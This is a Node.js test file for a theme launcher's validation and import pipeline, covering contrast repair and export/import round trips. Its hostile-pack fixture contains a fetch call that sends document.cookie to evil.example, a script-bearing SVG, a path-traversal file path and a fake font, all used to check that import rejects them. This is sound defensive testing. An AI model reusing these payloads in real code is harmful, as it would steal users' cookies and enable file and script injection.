// Offline checks for the theme pipeline (no Electron, no network): node tools/test-themes.cjs
// 1. every theme in themes/ validates; 2. .t3skin export -> import round trip; 3. hostile packs are defused.
'use strict';
const fs = require('node:fs'), os = require('node:os'), path = require('node:path'), assert = require('node:assert');
const Lib = require('../launcher/theme-library.cjs');
const V = require('../launcher/theme-validate.cjs');
const { exportTheme, importTheme, isThemePack } = require('../launcher/skinpack.cjs');
const { writeZip } = require('../launcher/zip.cjs');
let pass = 0; const ok = (c, m) => { assert.ok(c, m); pass++; console.log('  ✓ ' + m); };

const { items, problems } = Lib.loadAllThemes();
ok(problems.length === 0, `all ${items.length} themes load (${problems.map(p => p.id + ': ' + p.error).join('; ') || 'no problems'})`);
for (const id of Lib.BUILT_IN) { const it = items.find(i => i.id === id); ok(it && it.code.scene && it.code.welcome && it.report.selfCheck.every(c => c.ok), `${id}: scene + welcome valid, self-check all ✓`); }

// These palettes passed validation even though selected rows/text were unreadable.
for (const [name, palette] of Object.entries({
  dark: { bg: '#111111', surface: '#222222', text: '#aaaaaa', muted: '#aaaaaa', accent: '#ffffff', selection: '#111111', codeBg: '#111111', codeText: '#aaaaaa' },
  light: { bg: '#ffffff', surface: '#ffffff', text: '#666666', muted: '#666666', accent: '#000000', selection: '#000000', codeBg: '#ffffff', codeText: '#666666' },
})) {
  const raw = { name, palette, ui: { surface: 'solid' } }, before = JSON.stringify(raw);
  const result = V.validateTheme(raw, () => null), p = result.theme.palette;
  ok(result.ok, `${name}: interaction contrast is repaired without rejecting a usable theme`);
  const selected = V.mix(p.surface, p.text, 0.10);
  ok(V.ratio(p.text, selected) >= 4.5 && V.ratio(p.muted, selected) >= 4.5, `${name}: title and metadata remain readable on selected sidebar rows`);
  ok([V.mix(p.surface, p.text, 0.04), V.mix(p.surface, p.bg, 0.3), V.mix(p.surface, p.text, 0.05)].every(bg => V.ratio(p.muted, bg) >= 4.5), `${name}: secondary text remains readable on raised, muted and hovered panels`);
  ok([p.bg, p.surface].every(bg => V.ratio(p.text, V.mix(bg, p.selection, 0.4)) >= 4.5), `${name}: selected text remains readable on background and panel`);
  ok([p.bg, p.surface, selected].every(bg => V.ratio(p.muted, V.mix(bg, p.selection, 0.4)) >= 4.5), `${name}: selecting secondary text retains readable contrast`);
  ok(V.ratio(p.codeText, V.mix(p.codeBg, p.selection, 0.4)) >= 4.5, `${name}: selected code remains readable`);
  ok(V.ratio(p.onAccent, p.accent) >= 4.5, `${name}: primary action label remains readable after accent repair`);
  for (const pair of ['text on selected sidebar row', 'secondary text on selected sidebar row', 'secondary text on glass over scene', 'text selection on panel', 'code text selection']) {
    ok(result.report.contrast.some(row => row.pair === pair && row.ok), `${name}: report includes ${pair}`);
  }
  ok(JSON.stringify(raw) === before, `${name}: validation leaves the source palette unchanged`);
  const again = V.validateTheme(result.theme, () => null);
  ok(again.ok && JSON.stringify(again.theme.palette) === JSON.stringify(p), `${name}: repaired palette is stable when reloaded`);
}
for (const [surface, opacity] of [['solid', 0.97], ['paper', 0.94], ['glass', 0.6]]) {
  const result = V.validateTheme({ palette: { bg: '#111111', surface: '#222222', text: '#ffffff', muted: '#ffffff', accent: '#ffffff', selection: '#111111' }, ui: { surface, glass: 0.6 } }, () => null);
  const row = result.report.contrast.find(r => r.pair === 'secondary text on glass over scene');
  ok(row && row.bg === V.mix('#ffffff', '#222222', opacity), `${surface}: glass contrast uses the runtime panel opacity`);
}
const irreparable = V.validateTheme({ palette: { bg: '#777777', surface: '#777777', text: '#000000', muted: '#000000', accent: '#000000' }, ui: { surface: 'solid' }, textSafety: { scrim: 0.9 } }, () => null);
ok(!irreparable.ok && irreparable.report.contrast.some(row => !row.ok) && !irreparable.report.selfCheck[0].ok, 'incompatible surface colours fail validation and the contrast self-check');
ok(irreparable.theme.textSafety.scrim <= 0.92, 'unsatisfied scene contrast never raises the scrim past its schema limit');
const codeRepair = V.validateTheme({ palette: { bg: '#ffffff', surface: '#ffffff', text: '#111111', muted: '#222222', accent: '#333333', selection: '#000000', codeBg: '#777777', codeText: '#ffffff' }, ui: { surface: 'solid' } }, () => null);
const cp = codeRepair.theme.palette;
ok(codeRepair.ok && V.ratio(cp.codeText, cp.codeBg) >= 4.5 && V.ratio(cp.codeText, V.mix(cp.codeBg, cp.selection, 0.4)) >= 4.5, 'invalid code text is repaired before an incompatible selection tint is adjusted');
const coupled = V.validateTheme({ palette: { bg: '#111111', surface: '#222222', text: '#ffffff', muted: '#ffffff', accent: '#ffffff', selection: '#ffffff', codeBg: '#444444', codeText: '#aaaaaa' }, ui: { surface: 'solid' } }, () => null);
ok(coupled.ok && coupled.report.contrast.every(row => row.ok), 'code and selection repairs converge in one validation pass');
const header = V.validateTheme({ palette: { bg: '#111111', surface: '#222222', text: '#aaaaaa', muted: '#aaaaaa', accent: '#ffffff', selection: '#111111' }, ui: { surface: 'solid', topbar: 'glass' }, sceneColors: ['#ffffff'] }, () => null);
const headerBg = V.mix('#ffffff', '#222222', 0.62);
ok(header.ok && [header.theme.palette.text, header.theme.palette.muted].every(fg => V.ratio(fg, headerBg) >= 4.5) && header.report.contrast.some(row => row.pair === 'secondary text on topbar over scene' && row.bg === headerBg && row.ok), 'glass header text uses its independent 62% surface opacity');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 't3themes-'));
const pack = exportTheme(path.join(Lib.themesRoot, 'koi-pond'));
ok(isThemePack(pack), 'export produces a theme pack');
const { id } = importTheme(pack, tmp);
const dir = path.join(tmp, id);
ok(['theme.json', 'scene.js', 'welcome.js'].every(f => fs.existsSync(path.join(dir, f))), 'round trip keeps the code');
ok(!JSON.parse(fs.readFileSync(path.join(dir, 'theme.json'), 'utf8')).prompt, 'export drops the private prompt');

// hostile pack: network code, script-bearing SVG, path traversal, fake font, unreadable colours
const evil = { name: 'Evil', palette: { bg: '#ffffff', text: '#fefefe', accent: '#ffff00' }, scene: { file: 'scene.js' }, welcome: { file: '../../welcome.js' },
  icons: { custom: { settings: 'icons/settings.svg' } }, fonts: { files: [{ family: 'X', file: 'fonts/x.woff2' }] }, css: 'body{display:none}' };
const zip = writeZip([
  { name: 'theme.json', data: Buffer.from(JSON.stringify(evil)) },
  { name: 'scene.js', data: Buffer.from("T3Scene(function(api){ fetch('https://evil.example/' + document.cookie); return {}; });") },
  { name: 'icons/settings.svg', data: Buffer.from('<svg viewBox="0 0 24 24"><script>alert(1)</script><path d="M1 1h2"/></svg>') },
  { name: 'fonts/x.woff2', data: Buffer.from('MZ not a font') },
]);
const r2 = importTheme(zip, tmp), d2 = path.join(tmp, r2.id), t2 = JSON.parse(fs.readFileSync(path.join(d2, 'theme.json'), 'utf8'));
ok(!fs.existsSync(path.join(d2, 'scene.js')) && !t2.scene, 'network-using scene is rejected and not written');
ok(!fs.existsSync(path.join(d2, 'icons', 'settings.svg')) || V.sanitizeSvg(fs.readFileSync(path.join(d2, 'icons', 'settings.svg'), 'utf8')) === null, 'script SVG cannot be used');
ok(!fs.existsSync(path.join(d2, 'fonts', 'x.woff2')), 'fake font (bad magic bytes) is dropped');
const loaded = Lib.toItem(d2);
ok(loaded.item && !loaded.item.theme.css, 'free CSS is dropped');
const c = loaded.item.report;
ok(V.ratio(loaded.item.theme.palette.text, loaded.item.theme.palette.bg) >= 4.5, `unreadable text colour repaired (${c.fixes[0] || ''})`);
ok(V.sanitizeSvg('<svg viewBox="0 0 24 24"><path d="M2 2" onload="x()"/><use href="#a"/></svg>') === null, 'SVG with <use> rejected');
ok(/onload/.test(V.sanitizeSvg('<svg viewBox="0 0 24 24"><path d="M2 2" onload="x()"/></svg>')) === false, 'event-handler attributes stripped');
fs.rmSync(tmp, { recursive: true, force: true });
require('./theme-tech-checks.cjs')(ok);
console.log(`\n${pass} checks passed`);
